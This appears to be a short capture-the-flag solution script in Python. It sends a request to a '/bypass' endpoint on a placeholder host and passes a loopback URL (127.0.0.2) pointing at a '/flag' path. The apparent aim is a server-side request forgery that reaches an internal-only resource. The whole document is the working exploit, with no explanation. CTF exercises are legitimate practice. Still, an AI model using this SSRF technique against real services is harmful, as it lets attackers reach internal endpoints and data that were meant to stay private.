import requests

print(requests.get("http://<ip>:45394/bypass", params={"url": "http://127.0.0.2:45394/flag"}).text)